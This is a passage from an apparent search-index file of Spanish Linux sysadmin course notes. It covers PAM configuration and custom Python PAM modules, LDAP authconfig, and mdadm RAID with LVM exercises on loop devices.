dns/gateway> DNS2 = 4 .4.4.4 GATEWAY = 192 .168.0.1 <gateway> HOSTNAME = node01.tecmint.com <Nombre que te ven en l\u00ednea> IPADDR = 192 .68.0.100 <IP-deseada> NETMASK = 255 .255.255.0 <Mascara> TYPE = Ethernet NETWORKING_IPV6 = no <opcional> IPV6INIT = no <opcional> actualizar lo cambios. sudo systemctl restart network","title":"IP est\u00e1tica fedora."},{"location":"sistemas/pam/","text":"Pam pam es un conjunto de librer\u00edas, que proporciona una api para autenticar aplicaciones (servicios), los clientes de pam, son las aplicaciones que tienen que autenticar. PAM (plugable autenticable mode), la gracia es que es modular el programa(aplicaci\u00f3n) utiliza pam y este ya utiliza la autentificaci\u00f3n que se le haya asignado (contrase\u00f1a, huella dactilar, etc..). Una aplicaci\u00f3n pam aware , es una aplicaci\u00f3n que sabe que har\u00e1 autentificaci\u00f3n usando pam, en el archivo /etc/pam.conf Como saber que una aplicaci\u00f3n es pam aware , mirando si en sus requisitos existe alg\u00fan modulo pam. Cualquier programa que sea pam aware, y no tenga un fichero especifico en /etc/pam.d , se le aplica other, que deniega todo por defecto. ldd list dinamic dependencies. listar dependencias. \u279c ldd /usr/bin/chfn linux-vdso.so.1 ( 0x00007ffc98950000 ) libpam.so.0 = > /lib/x86_64-linux-gnu/libpam.so.0 ( 0x00007fe8f2566000 ) libpam_misc.so.0 = > /lib/x86_64-linux-gnu/libpam_misc.so.0 ( 0x00007fe8f2561000 ) .... Directorios de configuraci\u00f3n /etc/pam.d/ /etc/pam.conf ruta modulos de pam instalados /usr/lib64/security/ Ejemplo archivo pam #%PAM-1.0 #type control argument auth sufficient pam_rootok.so auth include system-auth account include system-auth password include system-auth session include system-auth file.so la extensi\u00f3n .so significa (shared object), objeto compartido, y este puede tener, o no argumentos. [ root@pam pam.d ] # cat system-auth #%PAM-1.0 # This file is auto-generated. # User changes will be destroyed the next time authconfig is run. auth required pam_env.so auth sufficient pam_unix.so try_first_pass nullok auth required pam_deny.so account required pam_unix.so password requisite pam_pwquality.so try_first_pass local_users_only retry = 3 authtok_type = password sufficient pam_unix.so try_first_pass use_authtok nullok sha512 shadow password required pam_deny.so session optional pam_keyinit.so revoke session required pam_limits.so -session optional pam_systemd.so session [ success = 1 default = ignore ] pam_succeed_if.so service in crond quiet use_uid session required pam_unix.so Types Pam tiene 4 types diferentes: auth, account, password, session Hay que saber diferenciar: auth autentificaci\u00f3n, demostrar quien soy autz a que me da derecho mi autentificaci\u00f3n auth autenticaci\u00f3n de usuario, quien soy. account tengo permiso para modificar password reglas para cambiar pasword session cosas a hacer al iniciar y cerrar sesi\u00f3n importante : pam no es un servicio, al hacer un cambio en los archivos es inmediato #%PAM-1.0 auth optional pam_echo.so [ auth: %h %s %t %u ] auth required pam_permit.so auth sufficient pam_unix.so account optional pam_echo.so [ auth: %h %s %t %u ] account sufficient pam_permit.so suficient si da cierto ya vale para la autentificaci\u00f3n, en caso que de falso se ignora Controls La opci\u00f3n de controls, es compleja, tiene echo unos alias donde agrupan una serie de opciones predefinidas mas habituales. ejemplo: required [ success = ok new_authtok_reqd = ok ignore = ignore default = bad ] requisite [ success = ok new_authtok_reqd = ok ignore = ignore default = die ] sufficient [ success = done new_authtok_reqd = done default = ignore ] optional [ success = ok new_authtok_reqd = ok default = ignore ] ignore : ignora esta opci\u00f3n bad : marca como fallo y sigue evaluando die : marca como fallo y no eval\u00faes m\u00e1s ok : marca como resultado positivo y sigue avaluando done : resultado positivo y no eval\u00faes m\u00e1s opciones N numero de casillas a saltar reset resetea valores anteriores Predefinidos required Esta opci\u00f3n siempre tendr\u00e1 que dar cierto, si da falso, fallara pero sigue preguntando la siguiente opci\u00f3n. requisite esta opci\u00f3n tiene que dar cierto, si da falso, cierra, no pasa a la siguiente opcion. suficient Si da cierto ya vale para la autentificaci\u00f3n, en caso que de falso se ignora optional Opciones que intentara hacer, el resultado de los m\u00f3dulos en este control, no afectara a no ser que sea el \u00fanico a evaluar include Incluir otros m\u00f3dulos de reglas existentes como si estuvieran en el mismo archivo substack llama a otro archivo y devuelve true o false, seg\u00fan la tabla de reglas. Ejemplo include, subsrack : En el caso siguiente substack llama al archivo proves, devuelve true, pasa a la siguiente regla y pide contrase\u00f1a pam_unix.so . Si cambiamos substack por include, include le el archivo proves y como el sufficient da true, ya lo da por valido, no pasa a la siguiente regla y no pide contrase\u00f1a. En el caso de que substack devuelva false, seguir\u00e1 preguntando reglas pero nunca dar\u00e1 positiva la acci\u00f3n. /etc/pam.d/chfn #%PAM-1.0 auth optional pam_echo.so auth substack proves auth required pam_unix.so account optional pam_echo.so account sufficient pam_permit.so /etc/pam.d/proves #%PAM-1.0 auth sufficient pam_permit.so Argumentos Manejo de contrase\u00f1as Los argumentos tipo pam_unix.so, pam_ldap.so, pam_mount.so, etc... que requiere insertar contrase\u00f1a, tienen diferentes atributos para gestionarlas. Si no tiene atributos se pedir\u00e1 contrase\u00f1a. try_first_pass si se a introducido una contrase\u00f1a anteriormente la hace servir, en el caso contrario la pide. use_first_pass usa la contrase\u00f1a introducida anteriormente, si no se ha introducido ninguna antes, no usara ninguna. nullok permite acceso a usuarios sin contrase\u00f1a. password requisite pam_pwquality.so establece las reglas para definir condiciones contrase\u00f1as /etc/securitt/pwquality.conf archivo de condiciones. Restricciones pam_succeed_if.so aplica restricciones auth required pam_succeed_if.so user = pere auth required pam_succeed_if.so user ! = \u201cpere\u201d auth required pam_succeed_if.so uid > 1000 Otra manera de restringir es crear un control propio. En el siguiente ejemplo, si el usuario es uid=1001 saltara una linea y se le denegara el acceso, en caso contrario se ignorara pam_succed_if y se evaluara la siguiente linea. auth [ success = 1 default = ignore ] pam_succeed_if.so debug uid = 1001 auth sufficient pam_permit.so auth sufficient pam_deny.so pam_time.so aplica restricciones, en condiciones en torno al tiempo. Solo funciona en account y funciona junto al archivo /etc/security/time.conf bloquear a local1 de 8h a 24h toda la semana services;ttys;users;times chfn;*;local1;Al0800-2400 todas las combinaciones aceptadas son: Mo Tu We Th Fr Sa Su Wk Wd Al, donde Al son todos, Wk de lunes a viernes, Wd fin de semana. Dos dias repetidos se anulan MoMo = ninguno, y MoWk = dias laborables menos lunes, AlFr = todos los dias excepto viernes. El formato de hora es un rango de HHMM-HHMM en modo 24h Homedir pam_mkhomedir.so indica que al iniciar sesi\u00f3n un usuario, a de crear, si no lo tiene, directamente el home de dicho usuario, por defecto lo creara con las directrices de skel, a no ser que se le indique lo contrario. system-auth session required pam_mkhomedir.so silent umask = 0007 Montajes Pam_mount permite crear puntos de montaje, de diferentes servicios . pam_mount.so tiene que estar en auth y session con el control opcional, a de estar antes del sufficient o del included. Para definir los puntos de montaje utiliza el archivo /etc/security/pam_mount.conf.xml auth optional pam_mount.so auth sufficient pam_ldap.so use_first_pass auth required pam_unix.so use_first_pass account sufficient pam_ldap.so session optional pam_mount.so un container para poder hacer mounts tienes que poner la opci\u00f3n --privileged en el run diferentes tipos de montaje. # tmpfs <volume user = \"*\" fstype = \"tmpfs\" mountpoint = \"~/tmp\" options = \"size=100M,uid=%(USER),mode=0775\" /> # nfs <volume user = \"*\" fstype = \"nfs\" server = \"fileserver\" path = \"/home/%(USER)\" mountpoint = \"~\" /> # sshfs <volume user = \"*\" fstype = \"fuse\" path = \"sshfs#%(USER)@fileserver:\" mountpoint = \"~\" /> # smbfs <volume user = \"user\" fstype = \"smbfs\" server = \"krueger\" path = \"public\" mountpoint = \"/home/user/krueger\" /> modulos pam /usr/lib64/security/ /etc/exports /usr/share/man * ( ro,sync ) /usr/share/doc * ( ro,sync ) exportfs -s mount -t nfs 172 .17.0.1:/usr/share/man /mnt Ejemplo system-auth para ldap #%PAM-1.0 # This file is auto-generated. # User changes will be destroyed the next time authconfig is run. auth required pam_env.so auth optional pam_mount.so auth sufficient pam_unix.so try_first_pass nullok auth sufficient pam_ldap.so try_first_pass auth required pam_deny.so account sufficient pam_unix.so account sufficient pam_ldap.so account required pam_deny.so password requisite pam_pwquality.so try_first_pass local_users_only retry = 3 authtok_type = password sufficient pam_unix.so try_first_pass use_authtok nullok sha512 shadow password sufficient pam_ldap.so try_first_pass password required pam_deny.so session optional pam_keyinit.so revoke session required pam_limits.so -session optional pam_systemd.so session [ success = 1 default = ignore ] pam_succeed_if.so service in crond quiet use_uid session required pam_mkhomedir.so session optional pam_mount.so session sufficient pam_unix.so session sufficient pam_ldap.so Authconfig Es una manera de modificar el archivo system-auth autom\u00e1ticamente, pasando-le una serie de par\u00e1metros que los encontraremos en authconfig --help y man authconfig . authconfig --enableshadow --enablelocauthorize \\ --enableldap \\ --enableldapauth \\ --ldapserver = 'ldapserver' \\ --ldapbase = 'dc=edt,dc=org' \\ --enablemkhomedir \\ --updateall enableldap : modifica los archivos nsswitch.conf, nslcd.conf para tener acceso al servidor ldap. enableldapauth : a\u00f1ade las lineas pam_ldap.so en el archivo system-auth enablemkhomedir : a\u00f1ade pam_mkhomedir.so a system-auth Aplicaci\u00f3n PamAware https://pypi.python.org/pypi/python-pam/ En ocasiones queremos que alguna aplicaci\u00f3n autentifique usuarios del sistema. Python tiene su modulo pam python-pam, python3-pam , que se puede instalar tanto con pip como con dnf. Ejemplo autentificaci\u00f3n con el sistema, si es correcta muestra un rango del 1 al 10. pamaware.py #!/usr/bin/python import pam p = pam . pam () userName = raw_input ( \"Nom usuari: \" ) userPasswd = raw_input ( \"Passwd: \" ) p . authenticate ( userName , userPasswd ) print ( ' {} {} ' . format ( p . code , p . reason )) if p . code == 0 : for i in range ( 1 , 11 ): print i , else : print \"Error autenticacio\" # python pamaware.py Nom usuari: marti Passwd: marti 10 User not known to the underlying authentication module Error autenticacio # python pamaware.py Nom usuari: pere Passwd: kaka 7 Authentication failure Error autenticacio # python pamaware.py Nom usuari: pere Passwd: pere 0 Success 1 2 3 4 5 6 7 8 9 10 Creaci\u00f3n modulo pam documentaci\u00f3n https://pypi.python.org/pypi/python-pam/1.8.1 http://stackoverflow.com/questions/5286321/pam-authentication-in-python-without-root-privileges Pam python https://atlee.ca/software/pam/index.html Python Pam http://pam-python.sourceforge.net/ Para la creaci\u00f3n de un modulo python, se necesita descargar y compilar el ejecutable pam_python.so . Este paquete tiene sus dependencias que instalamos a continuaci\u00f3n. tar xvzf pam-python-1.0.6.tar.gz dnf -y install sphinx python3-sphinx python2-sphinx gcc dnf -y install pam-devel dnf -y install redhat-rpm-config dnf -y install python-devel ## editar l\u00ednia 201 de: /usr/include/features.h: # he canviat 700 per 600 en la l\u00ednia # define _XOPEN_SOURCE 700 make cp src/pam_python.so /usr/lib64/security/. Una vez con el ejecutable del modulo en su sitio ya podemos crear nuestro archivo pam. para la prueba modifico el archivo /etc/pam.d/chfn #%PAM-1.0 auth optional pam-echo.so [ auth ------- ] auth sufficient pam_python.so /opt/docker/pam_mates.py account optional pam-echo.so [ account ------- ] account sufficient pam_python.so /opt/docker/pam_mates.py password include pam_deny.so session include pam_deny.so y ubico en /opt/docker mi programa pam_mates.py # pam_mates.py # Validar lusuari realitzant una pregunta de matemtiques def pam_sm_authenticate ( pamh , flags , argv ): print \"Quant fan 3*2?\" resposta = raw_input () if int ( resposta ) == 6 : return pamh . PAM_SUCCESS else : return pamh . PAM_AUTHTOK_ERR def pam_sm_setcred ( pamh , flags , argv ): return pamh . PAM_SUCCESS def pam_sm_acct_mgmt ( pamh , flags , argv ): return pamh . PAM_SUCCESS def pam_sm_open_session ( pamh , flags , argv ): return pamh . PAM_SUCCESS def pam_sm_close_session ( pamh , flags , argv ): return pamh . PAM_SUCCESS def pam_sm_chauthtok ( pamh , flags , argv ): return pamh . PAM_SUCCESS Este programa se a echo a partir de copiar el ejemplo pam_permit.py de la documentaci\u00f3n de pam_python. http://pam-python.sourceforge.net/examples/ Este ejemplo muestra el resultado del programa, si el usuario acierta la respuesta matem\u00e1tica, se le dejara cambiar el chfn $ chfn anna Changing finger information for anna. Name []: 2 Office []: 2 Office Phone []: 2 Home Phone []: 2 auth ----------------- Quant fan 3*2? 6 account -------------- Finger information changed .","title":"Pam"},{"location":"sistemas/pam/#pam","text":"pam es un conjunto de librer\u00edas, que proporciona una api para autenticar aplicaciones (servicios), los clientes de pam, son las aplicaciones que tienen que autenticar. PAM (plugable autenticable mode), la gracia es que es modular el programa(aplicaci\u00f3n) utiliza pam y este ya utiliza la autentificaci\u00f3n que se le haya asignado (contrase\u00f1a, huella dactilar, etc..). Una aplicaci\u00f3n pam aware , es una aplicaci\u00f3n que sabe que har\u00e1 autentificaci\u00f3n usando pam, en el archivo /etc/pam.conf Como saber que una aplicaci\u00f3n es pam aware , mirando si en sus requisitos existe alg\u00fan modulo pam. Cualquier programa que sea pam aware, y no tenga un fichero especifico en /etc/pam.d , se le aplica other, que deniega todo por defecto. ldd list dinamic dependencies. listar dependencias. \u279c ldd /usr/bin/chfn linux-vdso.so.1 ( 0x00007ffc98950000 ) libpam.so.0 = > /lib/x86_64-linux-gnu/libpam.so.0 ( 0x00007fe8f2566000 ) libpam_misc.so.0 = > /lib/x86_64-linux-gnu/libpam_misc.so.0 ( 0x00007fe8f2561000 ) ....","title":"Pam"},{"location":"sistemas/pam/#directorios-de-configuracion","text":"/etc/pam.d/ /etc/pam.conf ruta modulos de pam instalados /usr/lib64/security/ Ejemplo archivo pam #%PAM-1.0 #type control argument auth sufficient pam_rootok.so auth include system-auth account include system-auth password include system-auth session include system-auth file.so la extensi\u00f3n .so significa (shared object), objeto compartido, y este puede tener, o no argumentos. [ root@pam pam.d ] # cat system-auth #%PAM-1.0 # This file is auto-generated. # User changes will be destroyed the next time authconfig is run. auth required pam_env.so auth sufficient pam_unix.so try_first_pass nullok auth required pam_deny.so account required pam_unix.so password requisite pam_pwquality.so try_first_pass local_users_only retry = 3 authtok_type = password sufficient pam_unix.so try_first_pass use_authtok nullok sha512 shadow password required pam_deny.so session optional pam_keyinit.so revoke session required pam_limits.so -session optional pam_systemd.so session [ success = 1 default = ignore ] pam_succeed_if.so service in crond quiet use_uid session required pam_unix.so","title":"Directorios de configuraci\u00f3n"},{"location":"sistemas/pam/#types","text":"Pam tiene 4 types diferentes: auth, account, password, session Hay que saber diferenciar: auth autentificaci\u00f3n, demostrar quien soy autz a que me da derecho mi autentificaci\u00f3n auth autenticaci\u00f3n de usuario, quien soy. account tengo permiso para modificar password reglas para cambiar pasword session cosas a hacer al iniciar y cerrar sesi\u00f3n importante : pam no es un servicio, al hacer un cambio en los archivos es inmediato #%PAM-1.0 auth optional pam_echo.so [ auth: %h %s %t %u ] auth required pam_permit.so auth sufficient pam_unix.so account optional pam_echo.so [ auth: %h %s %t %u ] account sufficient pam_permit.so suficient si da cierto ya vale para la autentificaci\u00f3n, en caso que de falso se ignora","title":"Types"},{"location":"sistemas/pam/#controls","text":"La opci\u00f3n de controls, es compleja, tiene echo unos alias donde agrupan una serie de opciones predefinidas mas habituales. ejemplo: required [ success = ok new_authtok_reqd = ok ignore = ignore default = bad ] requisite [ success = ok new_authtok_reqd = ok ignore = ignore default = die ] sufficient [ success = done new_authtok_reqd = done default = ignore ] optional [ success = ok new_authtok_reqd = ok default = ignore ] ignore : ignora esta opci\u00f3n bad : marca como fallo y sigue evaluando die : marca como fallo y no eval\u00faes m\u00e1s ok : marca como resultado positivo y sigue avaluando done : resultado positivo y no eval\u00faes m\u00e1s opciones N numero de casillas a saltar reset resetea valores anteriores","title":"Controls"},{"location":"sistemas/pam/#predefinidos","text":"required Esta opci\u00f3n siempre tendr\u00e1 que dar cierto, si da falso, fallara pero sigue preguntando la siguiente opci\u00f3n. requisite esta opci\u00f3n tiene que dar cierto, si da falso, cierra, no pasa a la siguiente opcion. suficient Si da cierto ya vale para la autentificaci\u00f3n, en caso que de falso se ignora optional Opciones que intentara hacer, el resultado de los m\u00f3dulos en este control, no afectara a no ser que sea el \u00fanico a evaluar include Incluir otros m\u00f3dulos de reglas existentes como si estuvieran en el mismo archivo substack llama a otro archivo y devuelve true o false, seg\u00fan la tabla de reglas. Ejemplo include, subsrack : En el caso siguiente substack llama al archivo proves, devuelve true, pasa a la siguiente regla y pide contrase\u00f1a pam_unix.so . Si cambiamos substack por include, include le el archivo proves y como el sufficient da true, ya lo da por valido, no pasa a la siguiente regla y no pide contrase\u00f1a. En el caso de que substack devuelva false, seguir\u00e1 preguntando reglas pero nunca dar\u00e1 positiva la acci\u00f3n. /etc/pam.d/chfn #%PAM-1.0 auth optional pam_echo.so auth substack proves auth required pam_unix.so account optional pam_echo.so account sufficient pam_permit.so /etc/pam.d/proves #%PAM-1.0 auth sufficient pam_permit.so","title":"Predefinidos"},{"location":"sistemas/pam/#argumentos","text":"","title":"Argumentos"},{"location":"sistemas/pam/#manejo-de-contrasenas","text":"Los argumentos tipo pam_unix.so, pam_ldap.so, pam_mount.so, etc... que requiere insertar contrase\u00f1a, tienen diferentes atributos para gestionarlas. Si no tiene atributos se pedir\u00e1 contrase\u00f1a. try_first_pass si se a introducido una contrase\u00f1a anteriormente la hace servir, en el caso contrario la pide. use_first_pass usa la contrase\u00f1a introducida anteriormente, si no se ha introducido ninguna antes, no usara ninguna. nullok permite acceso a usuarios sin contrase\u00f1a. password requisite pam_pwquality.so establece las reglas para definir condiciones contrase\u00f1as /etc/securitt/pwquality.conf archivo de condiciones.","title":"Manejo de contrase\u00f1as"},{"location":"sistemas/pam/#restricciones","text":"pam_succeed_if.so aplica restricciones auth required pam_succeed_if.so user = pere auth required pam_succeed_if.so user ! = \u201cpere\u201d auth required pam_succeed_if.so uid > 1000 Otra manera de restringir es crear un control propio. En el siguiente ejemplo, si el usuario es uid=1001 saltara una linea y se le denegara el acceso, en caso contrario se ignorara pam_succed_if y se evaluara la siguiente linea. auth [ success = 1 default = ignore ] pam_succeed_if.so debug uid = 1001 auth sufficient pam_permit.so auth sufficient pam_deny.so pam_time.so aplica restricciones, en condiciones en torno al tiempo. Solo funciona en account y funciona junto al archivo /etc/security/time.conf bloquear a local1 de 8h a 24h toda la semana services;ttys;users;times chfn;*;local1;Al0800-2400 todas las combinaciones aceptadas son: Mo Tu We Th Fr Sa Su Wk Wd Al, donde Al son todos, Wk de lunes a viernes, Wd fin de semana. Dos dias repetidos se anulan MoMo = ninguno, y MoWk = dias laborables menos lunes, AlFr = todos los dias excepto viernes. El formato de hora es un rango de HHMM-HHMM en modo 24h","title":"Restricciones"},{"location":"sistemas/pam/#homedir","text":"pam_mkhomedir.so indica que al iniciar sesi\u00f3n un usuario, a de crear, si no lo tiene, directamente el home de dicho usuario, por defecto lo creara con las directrices de skel, a no ser que se le indique lo contrario. system-auth session required pam_mkhomedir.so silent umask = 0007","title":"Homedir"},{"location":"sistemas/pam/#montajes","text":"Pam_mount permite crear puntos de montaje, de diferentes servicios . pam_mount.so tiene que estar en auth y session con el control opcional, a de estar antes del sufficient o del included. Para definir los puntos de montaje utiliza el archivo /etc/security/pam_mount.conf.xml auth optional pam_mount.so auth sufficient pam_ldap.so use_first_pass auth required pam_unix.so use_first_pass account sufficient pam_ldap.so session optional pam_mount.so un container para poder hacer mounts tienes que poner la opci\u00f3n --privileged en el run diferentes tipos de montaje. # tmpfs <volume user = \"*\" fstype = \"tmpfs\" mountpoint = \"~/tmp\" options = \"size=100M,uid=%(USER),mode=0775\" /> # nfs <volume user = \"*\" fstype = \"nfs\" server = \"fileserver\" path = \"/home/%(USER)\" mountpoint = \"~\" /> # sshfs <volume user = \"*\" fstype = \"fuse\" path = \"sshfs#%(USER)@fileserver:\" mountpoint = \"~\" /> # smbfs <volume user = \"user\" fstype = \"smbfs\" server = \"krueger\" path = \"public\" mountpoint = \"/home/user/krueger\" /> modulos pam /usr/lib64/security/ /etc/exports /usr/share/man * ( ro,sync ) /usr/share/doc * ( ro,sync ) exportfs -s mount -t nfs 172 .17.0.1:/usr/share/man /mnt","title":"Montajes"},{"location":"sistemas/pam/#ejemplo-system-auth-para-ldap","text":"#%PAM-1.0 # This file is auto-generated. # User changes will be destroyed the next time authconfig is run. auth required pam_env.so auth optional pam_mount.so auth sufficient pam_unix.so try_first_pass nullok auth sufficient pam_ldap.so try_first_pass auth required pam_deny.so account sufficient pam_unix.so account sufficient pam_ldap.so account required pam_deny.so password requisite pam_pwquality.so try_first_pass local_users_only retry = 3 authtok_type = password sufficient pam_unix.so try_first_pass use_authtok nullok sha512 shadow password sufficient pam_ldap.so try_first_pass password required pam_deny.so session optional pam_keyinit.so revoke session required pam_limits.so -session optional pam_systemd.so session [ success = 1 default = ignore ] pam_succeed_if.so service in crond quiet use_uid session required pam_mkhomedir.so session optional pam_mount.so session sufficient pam_unix.so session sufficient pam_ldap.so","title":"Ejemplo system-auth para ldap"},{"location":"sistemas/pam/#authconfig","text":"Es una manera de modificar el archivo system-auth autom\u00e1ticamente, pasando-le una serie de par\u00e1metros que los encontraremos en authconfig --help y man authconfig . authconfig --enableshadow --enablelocauthorize \\ --enableldap \\ --enableldapauth \\ --ldapserver = 'ldapserver' \\ --ldapbase = 'dc=edt,dc=org' \\ --enablemkhomedir \\ --updateall enableldap : modifica los archivos nsswitch.conf, nslcd.conf para tener acceso al servidor ldap. enableldapauth : a\u00f1ade las lineas pam_ldap.so en el archivo system-auth enablemkhomedir : a\u00f1ade pam_mkhomedir.so a system-auth","title":"Authconfig"},{"location":"sistemas/pam/#aplicacion-pamaware","text":"https://pypi.python.org/pypi/python-pam/ En ocasiones queremos que alguna aplicaci\u00f3n autentifique usuarios del sistema. Python tiene su modulo pam python-pam, python3-pam , que se puede instalar tanto con pip como con dnf. Ejemplo autentificaci\u00f3n con el sistema, si es correcta muestra un rango del 1 al 10. pamaware.py #!/usr/bin/python import pam p = pam . pam () userName = raw_input ( \"Nom usuari: \" ) userPasswd = raw_input ( \"Passwd: \" ) p . authenticate ( userName , userPasswd ) print ( ' {} {} ' . format ( p . code , p . reason )) if p . code == 0 : for i in range ( 1 , 11 ): print i , else : print \"Error autenticacio\" # python pamaware.py Nom usuari: marti Passwd: marti 10 User not known to the underlying authentication module Error autenticacio # python pamaware.py Nom usuari: pere Passwd: kaka 7 Authentication failure Error autenticacio # python pamaware.py Nom usuari: pere Passwd: pere 0 Success 1 2 3 4 5 6 7 8 9 10","title":"Aplicaci\u00f3n PamAware"},{"location":"sistemas/pam/#creacion-modulo-pam","text":"documentaci\u00f3n https://pypi.python.org/pypi/python-pam/1.8.1 http://stackoverflow.com/questions/5286321/pam-authentication-in-python-without-root-privileges Pam python https://atlee.ca/software/pam/index.html Python Pam http://pam-python.sourceforge.net/ Para la creaci\u00f3n de un modulo python, se necesita descargar y compilar el ejecutable pam_python.so . Este paquete tiene sus dependencias que instalamos a continuaci\u00f3n. tar xvzf pam-python-1.0.6.tar.gz dnf -y install sphinx python3-sphinx python2-sphinx gcc dnf -y install pam-devel dnf -y install redhat-rpm-config dnf -y install python-devel ## editar l\u00ednia 201 de: /usr/include/features.h: # he canviat 700 per 600 en la l\u00ednia # define _XOPEN_SOURCE 700 make cp src/pam_python.so /usr/lib64/security/. Una vez con el ejecutable del modulo en su sitio ya podemos crear nuestro archivo pam. para la prueba modifico el archivo /etc/pam.d/chfn #%PAM-1.0 auth optional pam-echo.so [ auth ------- ] auth sufficient pam_python.so /opt/docker/pam_mates.py account optional pam-echo.so [ account ------- ] account sufficient pam_python.so /opt/docker/pam_mates.py password include pam_deny.so session include pam_deny.so y ubico en /opt/docker mi programa pam_mates.py # pam_mates.py # Validar lusuari realitzant una pregunta de matemtiques def pam_sm_authenticate ( pamh , flags , argv ): print \"Quant fan 3*2?\" resposta = raw_input () if int ( resposta ) == 6 : return pamh . PAM_SUCCESS else : return pamh . PAM_AUTHTOK_ERR def pam_sm_setcred ( pamh , flags , argv ): return pamh . PAM_SUCCESS def pam_sm_acct_mgmt ( pamh , flags , argv ): return pamh . PAM_SUCCESS def pam_sm_open_session ( pamh , flags , argv ): return pamh . PAM_SUCCESS def pam_sm_close_session ( pamh , flags , argv ): return pamh . PAM_SUCCESS def pam_sm_chauthtok ( pamh , flags , argv ): return pamh . PAM_SUCCESS Este programa se a echo a partir de copiar el ejemplo pam_permit.py de la documentaci\u00f3n de pam_python. http://pam-python.sourceforge.net/examples/ Este ejemplo muestra el resultado del programa, si el usuario acierta la respuesta matem\u00e1tica, se le dejara cambiar el chfn $ chfn anna Changing finger information for anna. Name []: 2 Office []: 2 Office Phone []: 2 Home Phone []: 2 auth ----------------- Quant fan 3*2? 6 account -------------- Finger information changed .","title":"Creaci\u00f3n modulo pam"},{"location":"sistemas/raid/","text":"Raid Modos de raid Firmware El modo de raid firmware es el raid basado en la BIOS, la propia BIOS tiene su controladora para gestionar la raid . Hardware El modo Hardware, consiste en una tarjeta pinchada en la placa que controla la raid. Software El modo Software es el propio sistema operativo que gestiona la raid. Tipo de raid tipo de raid wikipedia Raid software assemble construye la raid a partir de los superbloques build crea la raid sin a\u00f1adir la marca de superbloque al disco create crea la raid a\u00f1adiendo superbloques en sus discos Niveles de raid Calculadora raid Nivel n\u00ba discos n\u00ba discos que pueden fallar capacidad capacidad leer y escribir R0 2 0 100% excelente R1 2 max 1 50% L.MuyBuena / E.Buena R5 3 min 1 67% - 94% L.Muy buena / E.Buena R6 4 min 2 50% - 88% L.Buena / E.Buena R10 4 min 1 por cada mirror 50% L.Muy buena / E.Buena R50 6 min 1 por cada mirror 67% - 94% L.Excelente / E.Muy buena R60 8 min 2 por cada mirror 50% - 88% L.Muy buena / E.Buena Raid 0 Escribe y lee en los discos a la vez reparti\u00e9ndose la faena, resultado una escritura y lectura excelente. Lo malo que no tiene margen de error, si falla un disco pierdes los datos. Raid 1 Escribe en los 2 discos a la vez por si falla 1 tener el otro de backup. Raid 5 Hace una paridad de datos cada 2 bits genera un tercero de seguridad por si falla alg\u00fan disco. Raid 6 Hace lo mismo que raid 5 pero generando 2 bits de paridad, por lo tanto hay posibilidad de que fallen 2 discos sin perder datos. Raid 10 Son dos raid 1 unidas por una raid 0 , nivel de seguridad alto 1 disco por mirror pero se reduce la capacidad total de almacenamiento al 50% total. Raid 50 Dos raid 5 unidas por raid 0 velocidad excelente de lectura con nivel de seguridad alto de 2 discos de fallo. Raid 60 Dos raid 6 unidas por raid 0 m\u00e1xima seguridad en raid posibilidad de que fallen 4 discos dos por cada raid 6. una probabilidad muy peque\u00f1a. Crear raid sudo mdadm --create /dev/md0 --level = 1 --raid-devices = 3 /dev/loop0 /dev/loop1 /dev/loop2 sudo mdadm --create /dev/md/dades --level = 1 --raid-devices = 2 /dev/loop0 /dev/loop1 --spare-devices = 2 /dev/loop2 /dev/loop3 Al crear la raid inserta un peque\u00f1o bloque de datos en cada disco para gestionar la raid. Ver Informaci\u00f3n Raid sudo mdadm --detail /dev/md0 # ver estado del raid sudo mdadm --detail --scan # ver si existe alguna raid sudo mdadm --examine /dev/loop0 # ver datos del bloque raid en disco sudo mdadm --query /dev/loop0 sudo mdadm --query /dev/md0 cat /proc/mdstat # ver estado de raid Extraer disco sudo mdadm /dev/md0 --fail /dev/loop1 sudo mdadm /dev/md0 --remove /dev/loop1 A\u00f1adir disco sudo mdadm --manage /dev/md0 --add /dev/loop1 En este paso si los discos de la raid tienen datos, tardara en a\u00f1adirse por que tiene que sincronizarse. A\u00f1adir Spare Spare son los discos de reserva, cuando falla un disco de datos, este se empieza a sincronizar autom\u00e1ticamente. sudo mdadm /dev/md0 --add-spare /dev/loop2 Parar Raid Para, parar la raid a de estar desmontada del sistema de archivos. sudo mdadm --stop /dev/md0 # parar raid md0 sudo mdadm --stop --scan # para todas las raid Guardar raid sudo mdadm --examine --scan > /etc/mdadm.conf Reconstruir raid Como se guardan datos de la raid en cada disco es posible reconstruir una raid autom\u00e1ticamente. sudo mdadm --assemble --scan # automatico, si existe /etc/mdadm.conf no escaneara todos los discos. sudo mdadm --assemble /dev/md0 --run /dev/loop0 /dev/loop1 /dev/loop2 # indicando discos sudo mdadm --assemble /dev/md0 # siempre que exista el archivo /etc/mdadm.conf y este md0 dentro Limpiar superbloque sudo mdadm --zero-superblock /dev/loop0 Reshape Aumentar discos Aumentar a 3 discos y a\u00f1adir el tercero. sudo mdadm --grow /dev/md/raid1 --raid-devices 3 --add /dev/loop2 Cambiar nivel de raid De level 1 a level 5, lvel 1 solo puede tener 2 discos. sudo mdadm --grow /dev/md/raid1 --level 5 Aumentar tama\u00f1o sudo mdadm --grow /dev/md/raid1 --size = max # si esta montada se tendr\u00e1 que espandir el sistem de ficheros sudo resize2fs /dev/md127 Raid y LVM Ejercicio practico: un raid 1 de 2v discos de 500 un raid 1 de 2v discos de 500 primer raid crear pv y vg lv de 200 sistema y 300 dades montar incorpoprar al vg el segundo raid incrementar sistema +100 provocar fail raid1 eliminar vel primer raid del vg Crear discos dd if = /dev/zero of = disc1.img bs = 1k count = 500k dd if = /dev/zero of = disc2.img bs = 1k count = 500k dd if = /dev/zero of = disc3.img bs = 1k count = 500k dd if = /dev/zero of = disc4.img bs = 1k count = 500k losetup /dev/loop0 disc1.img losetup /dev/loop1 disc2.img losetup /dev/loop2 disc3.img losetup /dev/loop3 disc4.img Crear raids mdadm --create /dev/md/raid1 --level 1 --raid-devices 2 /dev/loop0 /dev/loop1 mdadm --create /dev/md/raid2 --level 1 --raid-devices 2 /dev/loop2 /dev/loop3 Crear marca PV y VG pvcreate /dev/md/raid1 pvcreate /dev/md/raid2 vgcreate mydisc /dev/md/raid2 Crear LVs crear montar y a\u00f1adir datos lvcreate -L 200M -n sistema /dev/mydisc lvcreate -L 100M -n dades /dev/mydisc mkfs.ext4 /dev/mydisc/sistema mkfs.ext4 /dev/mydisc/dades mount /dev/mydisc/sistema /mnt/sistema mount /dev/mydisc/dades /mnt/dades cp -r /boot/grub2/ /mnt/sistema/s1 cp -r /boot/grub2/ /mnt/sistema/s2 cp -r 